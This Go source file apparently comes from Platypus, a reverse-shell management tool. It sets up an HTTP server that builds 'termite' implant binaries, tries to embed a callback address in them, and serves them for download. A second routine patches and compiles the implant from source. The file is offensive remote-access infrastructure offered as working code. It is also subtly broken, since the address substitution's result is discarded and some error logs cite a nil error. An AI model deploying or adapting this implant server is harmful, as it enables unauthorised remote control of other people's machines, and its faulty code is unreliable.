package context

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/compiler"
	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/network"
	"github.com/WangYihang/Platypus/lib/util/resource"
	"github.com/WangYihang/Platypus/lib/util/str"
	"github.com/gin-gonic/gin"
)

func CreateDistributorServer(host string, port uint16) *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = ioutil.Discard
	endpoint := gin.Default()

	// Connect with context
	Ctx.Distributor = &Distributor{
		Host:       host,
		Port:       port,
		Interfaces: network.GatherInterfacesList(host),
		Route:      map[string]string{},
	}

	endpoint.GET("/:route_key/termite", func(c *gin.Context) {
		if !paramsExistOrAbort(c, []string{"route_key"}) {
			return
		}
		routeKey := c.Param("route_key")
		addr := Ctx.FindServerListeningAddressByDispatchKey(routeKey)

		// Step 0: Compile termite.go from template file
		target := fmt.Sprintf("/tmp/%s-%s-termite", time.Now().Format("2006-01-02-15:04:05"), str.RandomString(0x10))
		// err := BuildTermiteFromSourceCode(target, addr)
		// if err != nil {
		// 	panicRESTfully(c, err.Error())
		// 	return
		// }

		// Step 1: Generate Termite from Assets
		content, err := resource.Asset("termites/termite_linux_amd64")
		if err != nil {
			panicRESTfully(c, err.Error())
			return
		}
		bytes.Replace(content, []byte("__ADDRESS__"), []byte(addr), 1)

		err = ioutil.WriteFile(target, content, 0755)
		if err != nil {
			panicRESTfully(c, err.Error())
			return
		}

		// Compress binary
		if !compiler.Compress(target) {
			log.Error("Can not compress termite.go: %s", err)
		}

		// Response file
		c.File(target)
	})
	return endpoint
}

func BuildTermiteFromSourceCode(targetFilename string, targetAddress string) error {
	content, err := ioutil.ReadFile("termite.go")
	if err != nil {
		log.Error("Can not read termite.go: %s", err)
		return errors.New("can not read termite.go")
	}
	contentString := string(content)
	contentString = strings.Replace(contentString, "127.0.0.1:1337", targetAddress, -1)
	err = ioutil.WriteFile("termite.go", []byte(contentString), 0644)
	if err != nil {
		log.Error("Can not write termite.go: %s", err)
		return errors.New("can not write termite.go")
	}

	// Compile termite binary
	if !compiler.Compile(targetFilename) {
		log.Error("Can not compile termite.go: %s", err)
		return errors.New("can not compile termite.go")
	}
	return nil
}
